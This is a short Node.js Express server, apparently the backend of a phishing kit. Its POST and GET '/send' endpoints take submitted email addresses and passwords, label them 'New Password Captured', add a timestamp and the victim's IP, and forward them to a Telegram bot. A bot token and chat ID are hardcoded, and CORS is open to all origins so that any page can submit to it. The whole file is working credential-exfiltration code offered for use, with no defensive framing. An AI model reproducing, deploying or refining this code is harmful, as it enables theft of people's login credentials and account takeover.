// api.js - This runs on Render.com
const express = require('express');
const app = express();

// Allow any origin (CORS)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Endpoint to receive password and forward to Telegram
app.post('/send', async (req, res) => {
    const { email, password } = req.body;
    
    if (!password) {
        return res.status(400).json({ error: 'Password is required' });
    }

    const TELEGRAM_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
    const TELEGRAM_CHAT_ID = '8391692120';
    
    const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 IP: ${req.ip || 'Unknown'}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            res.json({ success: true, message: 'Password forwarded to Telegram' });
        } else {
            res.status(500).json({ error: 'Telegram API error', details: data });
        }
    } catch (error) {
        res.status(500).json({ error: 'Failed to forward to Telegram', details: error.message });
    }
});

// Optional: GET endpoint for testing
app.get('/send', async (req, res) => {
    const { email, password } = req.query;
    
    if (!password) {
        return res.status(400).json({ error: 'Password is required' });
    }

    const TELEGRAM_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
    const TELEGRAM_CHAT_ID = '8391692120';
    
    const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Proxy server running on port ${PORT}`);
});